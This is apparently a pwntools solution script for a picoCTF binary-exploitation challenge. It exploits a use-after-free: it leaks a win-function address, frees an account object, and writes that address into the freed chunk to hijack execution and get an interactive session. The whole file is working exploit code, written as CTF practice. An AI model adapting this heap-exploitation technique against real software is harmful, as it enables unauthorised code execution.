from pwn import *
from pwn import p32

elf = ELF('./vuln')

if args.REMOTE:
    r = remote('mercury.picoctf.net', 6312)
else:
    r = process(elf.path)

#define variables

def get_win_addr():
    r.sendline(b"S")
    r.recvuntil(b"leak...")
    win_addr = int(r.recvuntil("\n").rstrip(), 16)
    log.info("Got win addr: " + hex(win_addr))
    return win_addr

def create_account():
    r.sendline(b"M")
    payload = b'A'*4
    r.sendline(payload)

def delete_account():
    r.sendline(b"I")
    r.sendline(b"Y")

def leave_message(win_addr):
    r.sendline(b"l")
    r.recvuntil(b"anyways:")
    # Debug print
    log.info(f"Sending win addr: {hex(win_addr)}")
    r.send(p32(win_addr))
    log.info("Sent message")

#first get the win address
win = get_win_addr()
#allocate data to the account
create_account()
#free
delete_account()
#leave_message -> write in the address that will also be used by user pointer in malloc even if free'd
leave_message(win)
#something??
r.sendline(b"P")
r.interactive()


